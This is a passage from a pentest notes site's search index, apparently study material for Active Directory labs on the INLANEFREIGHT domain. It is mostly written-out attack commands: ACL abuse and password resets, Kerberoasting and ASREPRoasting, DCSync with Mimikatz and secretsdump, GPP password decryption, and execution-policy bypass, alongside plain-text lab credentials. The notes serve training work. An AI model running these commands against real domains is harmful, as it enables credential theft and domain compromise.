memberof</code></li> <li>Investigating the \"Information Technology Group\":<ol> <li><code>$itgroupsid = Convert-NameToSid \"Information Technology\"</code></li> <li><code>Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose</code></li> </ol> </li> <li>Looking for Interesting Access:<ol> <li><code>$adunnsid = Convert-NameToSid adunn</code> </li> <li><code>Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose</code></li> </ol> </li> </ol>"},{"location":"active-directory/acl/#acl-abuse-tactics","title":"ACL Abuse Tactics","text":"<ol> <li>Creating a PSCredential Object:<ol> <li><code>$SecPassword = ConvertTo-SecureString '&lt;PASSWORD HERE&gt;' -AsPlainText -Force</code></li> <li><code>$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\\wley', $SecPassword)</code></li> </ol> </li> <li>Creating a SecureString Object: <code>$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force</code></li> <li>Changing the User's Password with Set-DomainUserPassword: <code>Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose</code></li> <li>Creating a SecureString Object using user-name: <ol> <li><code>$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force</code></li> <li><code>$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\\damundsen', $SecPassword)</code></li> </ol> </li> <li>Adding user  to the Group:<ol> <li>List members: <code>Get-ADGroup -Identity \"Help Desk Level 1\" -Properties * | Select -ExpandProperty Members</code></li> <li>Add user: <code>Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose</code></li> <li>Confirming: <code>Get-DomainGroupMember -Identity \"Help Desk Level 1\" | Select MemberName</code></li> </ol> </li> <li>Creating a Fake SPN: <code>Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose</code></li> <li>Kerberoasting with Rubeus: <code>.\\Rubeus.exe kerberoast /user:adunn /nowrap</code></li> <li>Cleanup:<ol> <li>Removing the Fake SPN from adunn's Account: <code>Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose</code></li> <li>Removing user from the Group: <code>Remove-DomainGroupMember -Identity \"Help Desk Level 1\" -Members 'damundsen' -Credential $Cred2 -Verbose</code></li> <li>confirm the user was indeed removed: <code>Get-DomainGroupMember -Identity \"Help Desk Level 1\" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose</code></li> </ol> </li> </ol>"},{"location":"active-directory/adenumeration/","title":"AD Enumeration","text":""},{"location":"active-directory/adenumeration/#powershell","title":"Powershell","text":"<ol> <li>Find the member of the some group on given host: <code>Get-LocalGroupMember -Group \"GROUP NAME\"</code></li> <li>Look at the ACL for a single domain user: <code>(Get-ACL \"AD:$((Get-ADUser USER.NAME).distinguishedname)\").access  | ? {$_.IdentityReference -eq \"INLANEFREIGHT\\cliff.moore\"}</code></li> <li>Drill down further on this user to find all users with WriteProperty or GenericAll rights over the target user: <code>(Get-ACL \"AD:$((Get-ADUser daniel.carter).distinguishedname)\").access  | ? {$_.ActiveDirectoryRights -match \"WriteProperty\" -or $_.ActiveDirectoryRights -match \"GenericAll\"} | Select IdentityReference,ActiveDirectoryRights -Unique | ft -W</code></li> <li>Get GPO using GUID: <code>Get-GPO -Guid 831DE3ED-40B1-4703-ABA7-8EA13B2EB118</code></li> <li>What is the passwordhistorysize of the domain? <code>Get-ADDefaultDomainPasswordPolicy | Select-Object PasswordHistorySize</code></li> <li>Who is the group manager of the Citrix Admins group? <code>Get-ADUser -Identity \"&lt;DistinguishedName of Manager&gt;\" | Select-Object Name</code></li> </ol>"},{"location":"active-directory/adenumeration/#cmd","title":"CMD","text":"<ol> <li>Built-in tool that determines GPOs that have been applied to a given user or computer and their settings:<ol> <li><code>gpresult /r /user:harry.jones</code></li> <li><code>gpresult /r /S WS01</code></li> </ol> </li> <li>What is the passwordhistorysize of the domain? <code>net accounts</code></li> </ol>"},{"location":"active-directory/adenumeration/#powerview-sharpview-useful-command","title":"PowerView/ SharpView useful command","text":"<ol> <li>Convert a username to the corresponding SID <code>.\\SharpView.exe ConvertTo-SID -Name sally.jones</code></li> <li>Convert SID to a username: <code>.\\SharpView.exe Convert-ADName -ObjectName S-1-5-21-2974783224-3764228556-2640795941-1724</code></li> <li>Get Domain Info: <code>.\\SharpView.exe Get-Domain</code></li> <li>Get all OUs: <code>.\\SharpView.exe Get-DomainOU | findstr /b \"name\"</code></li> <li>Get users with PreauthNotRequired: <code>.\\SharpView.exe Get-DomainUser -KerberosPreauthNotRequired</code></li> <li>Gathering information about individual hosts: <code>Get-DomainComputer | select dnshostname, useraccountcontrol</code></li> <li>Return all Group Policy Objects (GPOs) names: <code>.\\SharpView.exe Get-DomainGPO | findstr displayname</code></li> <li>Determine which GPOs map back to which hosts: <code>Get-DomainGPO -ComputerIdentity WS01 | select displayname</code></li> <li>Check if our current user has local admin rights on any remote hosts: <code>Test-AdminAccess -ComputerName SQL01</code></li> <li>Eenumerate open shares on a remote computer: <code>.\\SharpView.exe Get-NetShare -ComputerName DC01</code></li> <li>Find domain machines that users are logged into: <code>Find-DomainUserLocation</code></li> <li>All domain trusts for our current domain: <code>Get-DomainTrust</code></li> </ol>"},{"location":"active-directory/adenumeration/#enumerating-ad-users","title":"Enumerating AD users","text":"<ol> <li>Users number: <code>(Get-DomainUser).count</code></li> <li>Get user with properties: <code>Get-DomainUser -Identity USER-NAME -Domain DOMAIN-NAME | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,mail,useraccountcontrol</code></li> <li>Enumerate these properties for ALL domain users and export them to a CSV file: <code>Get-DomainUser * -Domain DOMAIN-NAME | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,mail,useraccountcontrol | Export-Csv .\\inlanefreight_users.csv -NoTypeInformation</code></li> <li>Obtaining a list of users that do not require Kerberos pre-authentication and can be subjected to an ASREPRoast attack: <code>.\\SharpView.exe Get-DomainUser -KerberosPreauthNotRequired -Properties samaccountname,useraccountcontrol,memberof</code></li> <li>Gather information about users with Kerberos constrained delegation: <code>.\\SharpView.exe Get-DomainUser -TrustedToAuth -Properties samaccountname,useraccountcontrol,memberof</code></li> <li>Users that allow unconstrained delegation: <code>.\\SharpView.exe Get-DomainUser -LDAPFilter \"(userAccountControl:1.2.840.113556.1.4.803:=524288)\"</code></li> <li>Any domain users with sensitive data such as a password stored in the description field: <code>Get-DomainUser -Properties samaccountname,description | Where {$_.description -ne $null}</code></li> <li>Enumerate any users with Service Principal Names (SPNs) that could be subjected to a Kerberoasting attack: <code>.\\SharpView.exe Get-DomainUser -SPN -Properties samaccountname,memberof,serviceprincipalname</code></li> <li>Enumerate any users from other (foreign) domains with group membership within any groups in our current domain: <code>Find-ForeignGroup</code></li> <li>Checking for users with Service Principal Names (SPNs) set in other domains that we can authenticate into via inbound or bi-directional trust relationships with forest-wide authentication allowing all users to authenticate across a trust or selective-authentication set up which allows specific users to authenticate: <code>Get-DomainUser -SPN -Domain freightlogistics.local | select samaccountname,memberof,serviceprincipalname | fl</code></li> <li>Display all password set times: <code>Get-DomainUser -Properties samaccountname,pwdlastset,lastlogon -Domain InlaneFreight.local | select samaccountname, pwdlastset, lastlogon | Sort-Object -Property pwdlastset</code></li> <li>If you want only to show passwords set before a certain date: <code>Get-DomainUser -Properties samaccountname,pwdlastset,lastlogon -Domain InlaneFreight.local | select samaccountname, pwdlastset, lastlogon | where { $_.pwdlastset -lt (Get-Date).addDays(-90) }</code></li> </ol>"},{"location":"active-directory/adenumeration/#enumerating-ad-groups","title":"Enumerating AD Groups","text":"<ol> <li>Get Domain's Groups: <code>Get-DomainGroup -Properties Name</code></li> <li>Use Get-DomainGroupMember to examine group membership in any given group: <code>.\\SharpView.exe Get-DomainGroupMember -Identity 'Help Desk'</code></li> <li>Look for all AD groups with the AdminCount attribute set to 1, signifying that this is a protected group: <code>.\\SharpView.exe Get-DomainGroup -AdminCount</code></li> <li>Look for any managed security groups: <code>Find-ManagedSecurityGroups | select GroupName</code></li> <li>Look at the Security Operations group and see if the group has a manager set: <code>Get-DomainManagedSecurityGroup</code></li> <li>Enumerating the ACLs set on this group: <ol> <li><code>$sid = ConvertTo-SID user-name</code></li> <li><code>Get-DomainObjectAcl -Identity 'Security Operations' | ?{ $_.SecurityIdentifier -eq $sid}</code></li> </ol> </li> <li>Check local group membership: <code>Get-NetLocalGroup -ComputerName WS01 | select GroupName</code></li> <li>Enumerate the local group members on any given host: <code>.\\SharpView.exe Get-NetLocalGroupMember -ComputerName WS01</code></li> <li>Same function to check all the hosts that a given user has local admin access:<ol> <li><code>$sid = Convert-NameToSid USER-NAME</code></li> <li><code>$computers = Get-DomainComputer -Properties dnshostname | select -ExpandProperty dnshostname</code></li> <li><code>foreach ($line in $computers) {Get-NetLocalGroupMember -ComputerName $line | ? {$_.SID -eq $sid}}</code></li> </ol> </li> </ol>"},{"location":"active-directory/adenumeration/#enumerating-ad-computers","title":"Enumerating AD Computers","text":"<ol> <li>Get hostname, operating system, and User Account Control (UAC) attributes and save to file: <code>.\\SharpView.exe Get-DomainComputer -Properties dnshostname,operatingsystem,lastlogontimestamp,useraccountcontrol | Export-Csv .\\inlanefreight_computers.csv -NoTypeInformation</code></li> <li>Find to any computers in the domain are configured to allow unconstrained delegation and find one, the domain controller, which is standard: <code>.\\SharpView.exe Get-DomainComputer -Unconstrained -Properties dnshostname,useraccountcontrol</code></li> <li>Check for any hosts set up to allow for constrained delegation: <code>Get-DomainComputer -TrustedToAuth | select -Property dnshostname,useraccountcontrol</code></li> </ol>"},{"location":"active-directory/adenumeration/#enumerating-domain-acls","title":"Enumerating Domain ACLs","text":"<ol> <li>Look at the ACL for a single domain user: <code>Get-DomainObjectAcl -Identity USER.NAME -Domain inlanefreight.local -ResolveGUIDs</code></li> <li>Seek out ACLs on specific users and filter out results using the various AD filters: <code>Find-InterestingDomainAcl -Domain inlanefreight.local -ResolveGUIDs</code></li> <li>Look at the ACLs set on file shares: <ol> <li><code>Get-NetShare -ComputerName SQL01</code></li> <li><code>Get-PathAcl \"\\\\SQL01\\DB_backups\"</code></li> </ol> </li> <li>Use the Get-ObjectACL function to search for all users that have these rights: <code>Get-ObjectACL \"DC=inlanefreight,DC=local\" -ResolveGUIDs | ? { ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get')} | Select-Object SecurityIdentifier | Sort-Object -Property SecurityIdentifier -Unique</code></li> <li>Convert the SID back to the user: <code>convertfrom-sid S-1-5-21-2974783224-3764228556-2640795941-1883</code></li> <li>Point 5 and 6 can be done:<ol> <li><code>$dcsync = Get-ObjectACL \"DC=inlanefreight,DC=local\" -ResolveGUIDs | ? { ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get')} | Select-Object -ExpandProperty SecurityIdentifier | Select -ExpandProperty value</code></li> <li><code>Convert-SidToName $dcsync</code></li> </ol> </li> </ol>"},{"location":"active-directory/adenumeration/#enumerating-group-policy-objects-gpos","title":"Enumerating Group Policy Objects (GPOs)","text":"<ol> <li>Gathering GPO names: <code>Get-DomainGPO | select displayname</code></li> <li>Check which GPOs apply to a specific computer: <code>Get-DomainGPO -ComputerName WS01 | select displayname</code></li> <li>We can use the Get-DomainGPO and Get-ObjectAcl using the SID for the Domain Users group to see if this group has any permissions assigned to any GPOs: <code>Get-DomainGPO | Get-ObjectAcl | ? {$_.SecurityIdentifier -eq 'S-1-5-21-2974783224-3764228556-2640795941-513'}</code></li> </ol>"},{"location":"active-directory/adenumeration/#enumerating-ad-trusts","title":"Enumerating AD Trusts","text":"<ol> <li>Get Domain Trust: <code>Get-DomainTrust</code></li> <li>Use the function Get-DomainTrustMapping to enumerate all trusts for our current domain and other reachable domains: <code>Get-DomainTrustMapping</code></li> </ol>"},{"location":"active-directory/adenumeration/#various","title":"Various","text":"<ol> <li>Test Admin Access: <code>Test-AdminAccess -ComputerName ACADEMY-EA-MS01</code></li> <li>Finding Users With SPN Set: <code>Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName</code></li> <li></li> </ol>"},{"location":"active-directory/adenumeration/#links","title":"Links","text":"<ol> <li>https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg</li> <li>SharpGPOAbuse is an excellent tool that can be used to take advantage of GPO misconfigurations.</li> </ol>"},{"location":"active-directory/bloodhound/","title":"BloodHound","text":""},{"location":"active-directory/bloodhound/#installation","title":"Installation","text":"<p>For Windows 1. Install Java Silently: <code>.\\jdk-11.0.17_windows-x64_bin.exe /s</code> 2. Unzip Neo4j: <code>Expand-Archive .\\neo4j-community-4.4.16-windows.zip .</code> 3. Install Neo4j Service: <code>.\\neo4j-community-4.4.16\\bin\\neo4j.bat install-service</code> 4. Start Service: <code>net start neo4j</code> 5. Configure Neo4j Database:     1. Navigate to the Neo4j web console at http://localhost:7474/     2. Authenticate to Neo4j in the web console with username neo4j and password neo4j 6. Download BloodHound GUI:     1. Get last version from https://github.com/BloodHoundAD/BloodHound/releases.     2. Unzip the folder and double-click BloodHound.exe.     3. Authenticate with the credentials you set up for neo4j For Linux 1. Updating APT sources to install Java:     1. <code>echo \"deb http://httpredir.debian.org/debian stretch-backports main\" | sudo tee -a /etc/apt/sources.list.d/stretch-backports.list</code>     2. <code>sudo apt-get update</code> 2. Updating APT sources to install Neo4j:     1. <code>wget -O - https://debian.neo4j.com/neotechnology.gpg.key | sudo apt-key add -</code>     2. <code>echo 'deb https://debian.neo4j.com stable 4.4' | sudo tee -a /etc/apt/sources.list.d/neo4j.list</code>     3. <code>sudo apt-get update</code> 3. Installing required packages: <code>sudo apt-get install apt-transport-https</code> 4. Installing Neo4j: <code>sudo apt list -a neo4j</code> 5. Installing Neo4j 4.4.X: <code>sudo apt install neo4j=1:4.4.16 -y</code> 6. Change Java version to 11: <code>sudo update-alternatives --config java</code> 7. Running Neo4j as console:     1. <code>cd /usr/bin</code>     2. <code>sudo ./neo4j console</code> 8. Start Neo4j: <code>sudo systemctl start neo4j</code> 9. Download and uzip BloodHound 10. Execute BloodHound:     1. <code>cd BloodHound-linux-x64/</code>     2. <code>./BloodHound --no-sandbox</code></p>"},{"location":"active-directory/bloodhound/#sharphound-data-collection-from-windows","title":"SharpHound - Data Collection from Windows","text":"<ol> <li>Running SharpHound without any option: <code>SharpHound.exe</code></li> <li>Importing Data into BloodHound:<ol> <li>Start service: <code>net start neo4j</code></li> <li>Launch C:\\Tools\\BloodHound\\BloodHound.exe and log in with the following credentials</li> <li>Click the upload button on the far right, browse to the zip file, and upload it. You will see a status showing upload % completion.</li> <li>Once the upload is complete, we can analyze the data. If we want to view information about the domain, we can type Domain:INLANEFREIGHT.HTB into the search box. This will show an icon with the domain name. If you click the icon, it will display information about the node (the domain), how many users, groups, computers, OUs, etc.</li> </ol> </li> </ol>"},{"location":"active-directory/credentials/","title":"Credentials Haunting","text":""},{"location":"active-directory/credentials/#enumerating-security-controls","title":"Enumerating Security Controls","text":"<ol> <li>Checking the Status of Defender with Get-MpComputerStatus: <code>Get-MpComputerStatus</code></li> <li>Using Get-AppLockerPolicy cmdlet: <code>Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections</code></li> <li>PowerShell Constrained Language Mode: <code>$ExecutionContext.SessionState.LanguageMode</code></li> <li>Using Find-LAPSDelegatedGroups: <code>Find-LAPSDelegatedGroups</code></li> <li>Using Find-AdmPwdExtendedRights: <code>Find-AdmPwdExtendedRights</code></li> <li>Using Get-LAPSComputers: <code>Get-LAPSComputers</code></li> </ol>"},{"location":"active-directory/credentials/#credentialed-enumeration-from-linux","title":"Credentialed Enumeration - from Linux","text":"<ol> <li>CME - Domain User Enumeration: <code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users</code></li> <li>CME - Domain Group Enumeration: <code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups</code></li> <li>CME - Logged On Users: <code>sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users</code></li> <li>CME Share Searching: <code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares</code></li> <li>The module spider_plus will dig through each readable share on the host and list all readable files: <code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'</code> When completed, CME writes the results to a JSON file located at /tmp/cme_spider_plus/. <li>SMBMap To Check Access: <code>smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5</code></li> <li>Smbmap - Recursive List Of All Directories: <code>smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only</code></li> <li>SMB NULL Session with rpcclient: <code>rpcclient -U \"\" -N 172.16.5.5</code></li> <li>To connect to a host with psexec.py, we need credentials for a user with local administrator privileges: <code>psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125</code></li> <li>Wmiexec.py utilizes a semi-interactive shell where commands are executed through Windows Management Instrumentation: <code>wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5</code></li> <li>Windapsearch - Domain Admins: <code>python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da</code></li> <li>Windapsearch - Privileged Users: <code>python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU</code></li> <li>Executing BloodHound.py: <code>sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all</code></li>"},{"location":"active-directory/credentials/#credentialed-enumeration-from-windows","title":"Credentialed Enumeration - from Windows","text":"<ol> <li>Load ActiveDirectory Module: <code>Import-Module ActiveDirectory</code></li> <li>Get Domain Info: <code>Get-ADDomain</code></li> <li>Get-ADUser: <code>Get-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName</code></li> <li>Checking For Trust Relationships: <code>Get-ADTrust -Filter *</code></li> <li>Group Enumeration: <code>Get-ADGroup -Filter * | select name</code></li> <li>Detailed Group Info: <code>Get-ADGroup -Identity \"Backup Operators\"</code></li> <li>Group Membership: <code>Get-ADGroupMember -Identity \"Backup Operators\"</code></li> <li>Snaffler is a tool that can help us acquire credentials or other sensitive data in an Active Directory environment: <code>Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data</code></li> <li>SharpHound: <code>.\\SharpHound.exe -c All --zipfilename ILFREIGHT</code></li> </ol>"},{"location":"active-directory/credentials/#kerberoasting-from-linux","title":"Kerberoasting - from Linux","text":"<ol> <li>Listing SPN Accounts with GetUserSPNs.py: <code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend</code></li> <li>Requesting all TGS Tickets: <code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request</code></li> <li>Requesting a Single TGS ticket: <code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev</code></li> <li>Saving the TGS Ticket to an Output File: <code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs</code></li> <li>Cracking the Ticket Offline with Hashcat: <code>hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt</code></li> </ol>"},{"location":"active-directory/credentials/#kerberoasting-from-windows","title":"Kerberoasting - from Windows","text":""},{"location":"active-directory/credentials/#kerberoasting-semi-manual-method","title":"Kerberoasting - Semi Manual method","text":"<ol> <li>Enumerating SPNs with setspn.exe: <code>setspn.exe -Q */*</code></li> <li>Targeting a Single User:<ol> <li><code>Add-Type -AssemblyName System.IdentityModel</code></li> <li><code>New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433\"</code></li> </ol> </li> <li>Retrieving All Tickets Using setspn.exe: <code>setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }</code></li> <li>Extracting Tickets from Memory with Mimikatz:<ol> <li><code>mimikatz # base64 /out:true</code></li> <li><code>mimikatz # kerberos::list /export</code></li> </ol> </li> <li>Preparing the Base64 Blob for Cracking: <code>echo \"&lt;base64 blob&gt;\" |  tr -d \\\\n</code></li> <li>Placing the Output into a File as .kirbi: <code>cat encoded_file | base64 -d &gt; sqldev.kirbi</code></li> <li>Extracting the Kerberos Ticket using kirbi2john.py: <code>python2.7 kirbi2john.py sqldev.kirbi</code></li> <li>Modifiying crack_file for Hashcat: <code>sed 's/\\$krb5tgs\\$\\(.*\\):\\(.*\\)/\\$krb5tgs\\$23\\$\\*\\1\\*\\$\\2/' crack_file &gt; sqldev_tgs_hashcat</code></li> <li>Cracking the Hash with Hashcat: <code>hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt</code></li> </ol>"},{"location":"active-directory/credentials/#kerberoasting-automated-tool-based-route","title":"Kerberoasting - Automated / Tool Based Route","text":"<ol> <li>Using PowerView to Extract TGS Tickets: <code>Get-DomainUser * -spn | select samaccountname</code></li> <li>Using PowerView to Target a Specific User: <code>Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat</code></li> <li>Exporting All Tickets to a CSV File: <code>Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\\ilfreight_tgs.csv -NoTypeInformation</code></li> <li>Viewing the Contents of the .CSV File: <code>cat .\\ilfreight_tgs.csv</code></li> </ol>"},{"location":"active-directory/credentials/#kerberoasting-with-rubeus","title":"Kerberoasting with Rubeus","text":"<ol> <li>Using the /stats Flag: <code>.\\Rubeus.exe kerberoast /stats</code></li> <li>Using the /nowrap Flag: <code>.\\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap</code></li> <li>creating an SPN account named testspn and using Rubeus to Kerberoast this specific user to test this out: <code>.\\Rubeus.exe kerberoast /user:testspn /nowrap</code></li> <li>Checking with PowerView: <code>Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes</code></li> <li>Use Rubeus with the /tgtdeleg flag to specify that we want only RC4 encryption when requesting a new service ticket: <code>.\\Rubeus.exe kerberoast /tgtdeleg /user:testspn /nowrap</code></li> </ol>"},{"location":"active-directory/credentials/#dcsync","title":"DCSync","text":"<ol> <li>Using Get-DomainUser to View user Group Membership: <code>Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl</code></li> <li>Using Get-ObjectAcl to Check adunn's Replication Rights:<ol> <li><code>$sid= \"S-1-5-21-3842939050-3880317879-2865463114-1164\"</code></li> <li><code>Get-ObjectAcl \"DC=inlanefreight,DC=local\" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl</code></li> </ol> </li> <li>Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py: <code>secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5</code></li> <li>Enumerating Further using Get-ADUser: <code>Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl</code></li> <li>Checking for Reversible Encryption Option using Get-DomainUser: <code>Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontro</code></li> <li>Using runas.exe: <code>runas /netonly /user:INLANEFREIGHT\\adunn powershell</code></li> <li>Performing the Attack with Mimikatz:<ol> <li><code>.\\mimikatz.exe</code></li> <li><code>privilege::debug</code></li> <li><code>lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\\administrator</code></li> </ol> </li> </ol>"},{"location":"active-directory/credentials/#password-in-description-field","title":"Password in Description Field","text":"<ol> <li>Finding Passwords in the Description Field using Get-Domain User: <code>Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}</code></li> <li>Checking for PASSWD_NOTREQD Setting using Get-DomainUser: <code>Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol</code></li> <li>Credentials in SMB Shares and SYSVOL Scripts: <ol> <li>Discovering an Interesting Script: <code>ls \\\\academy-ea-dc01\\SYSVOL\\INLANEFREIGHT.LOCAL\\scripts</code></li> <li>Finding a Password in the Script: <code>cat \\\\academy-ea-dc01\\SYSVOL\\INLANEFREIGHT.LOCAL\\scripts\\reset_local_admin_pass.vbs</code></li> </ol> </li> <li>Group Policy Preferences (GPP) Passwords:<ol> <li>Locating &amp; Retrieving GPP Passwords with CrackMapExec: <code>crackmapexec smb -L | grep gpp</code></li> <li>Using CrackMapExec's gpp_autologin Module: <code>crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin</code></li> <li>Decrypting the Password with gpp-decrypt: <code>gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE</code></li> </ol> </li> </ol>"},{"location":"active-directory/credentials/#asreproasting","title":"ASREPRoasting","text":"<ol> <li>Enumerating for DONT_REQ_PREAUTH Value using Get-DomainUser: <code>Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl</code></li> <li>Retrieving AS-REP in Proper Format using Rubeus: <code>.\\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat</code></li> <li>Cracking the Hash Offline with Hashcat: <code>hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt</code></li> <li>Retrieving the AS-REP Using Kerbrute: <code>kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt</code></li> <li>Hunting for Users with Kerberoast Pre-auth Not Required: <code>GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users</code></li> </ol>"},{"location":"active-directory/credentials/#group-policy-object-gpo-abuse","title":"Group Policy Object (GPO) Abuse","text":"<ol> <li>Enumerating GPO Names with PowerView: <code>Get-DomainGPO |select displayname</code></li> <li>Enumerating GPO Names with a Built-In Cmdlet: <code>Get-GPO -All | Select DisplayName</code></li> <li>Enumerating Domain User GPO Rights:<ol> <li><code>$sid=Convert-NameToSid \"Domain Users\"</code></li> <li><code>Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}</code></li> </ol> </li> <li>Converting GPO GUID to Name: <code>Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532</code></li> </ol>"},{"location":"active-directory/crtp/","title":"CRTP","text":"<p>PowerShell Execution Policy - how to bypass:  1. <code>powershell -ExecutionPolicy bypass</code>  2. <code>powershell -c &lt;cmd&gt;</code>  3. <code>powershell -encodedcommand</code>  4. <code>$env:PSExecutionPolicyPreference=\"bypass\"</code></p>"},{"location":"active-directory/crtp/#domain-enumeration","title":"Domain Enumeration","text":""},{"location":"active-directory/crtp/#built-in-tools","title":"Built-in tools","text":"<ol> <li>$ADClass = [System.DirectoryServices.ActiveDirectory.Domain]</li> <li>$ADClass::GetCurentDomain() To speed up things use PowerView.ps1 or ActiveDirectory PowerShell module Enumerate following for given domain:</li> <li>Users</li> <li>Computers</li> <li>Domain Administrators</li> <li>Enterprase Administrators</li> <li>Shares</li> </ol>"},{"location":"active-directory/crtp/#powerview","title":"PowerView","text":"<ol> <li>Enumerate Domain: <code>Get-NetDoamin</code> </li> <li>Get object of another domain: <code>Get-NetDomain -Domain domain-name</code></li> <li>Get Domain SID: <code>Get-DoaminSID</code> </li> <li>Get Domain Policy: <code>Get-DomainPolicy</code></li> <li>Get default Domain Policy for machines: <code>(Get-DomainPolicy).\"system access\"</code></li> <li>Get Kerberos policy : <code>(Get-DomainPolicy).\"Kerberos Policy\"</code></li> <li>Get info about DC: <code>Get-NetDomainController</code></li> <li>Get info about DC from another doamin: <code>Get-NetDomainController -Domain domain-name</code> </li> <li>List all users: <code>Get-NetUser</code> </li> <li>List all users and select property: <code>Get-NetUser | select cn</code> </li> <li>Get particular user: <code>Get-NetUser -UserName user-name</code> </li> <li>Checking description property for find passwords: <code>Find-UserField -SearchField Description -SearchTerm password</code></li> <li>Get computers from current domain: <code>Get-NetComputer</code></li> <li>Get all groups in current domain: <code>Get-NetGroup</code></li> <li>Get all members of the group: <code>Get-NetGroupMember -GroupName \"Domain Admins\" -Recurse</code></li> <li>Get group membership for a user: <code>Get-NetGroup -UserName \"user-name\"</code></li> <li>Get local groups: <code>Get-NetLocalGroup -ComputerName computer-name -ListGroups</code></li> <li>Get actively logged users: <code>Get-NetLoggedon -ComputerName computer-name</code></li> <li>Find shares on host in current domain: <code>Invoke-ShareFInder -Verbose</code></li> <li>Find sensitive files on computer in current domain: <code>Invoke-FileFinder -Verbose</code></li> <li>Get all fileservers of the domain: <code>Get-NetFileServer</code></li> <li>Get Domain Trust: <code>Get-NetDomainTrust</code></li> <li>Get details about current forest: <code>Get-NetForest</code>, <code>Get-NetForest -Forest forest-name</code></li> <li>Get all domains in current forest: <code>Get-NetForestDomain</code></li> </ol>"},{"location":"active-directory/crtp/#activedirectory-module","title":"ActiveDirectory Module","text":"<ol> <li>Import 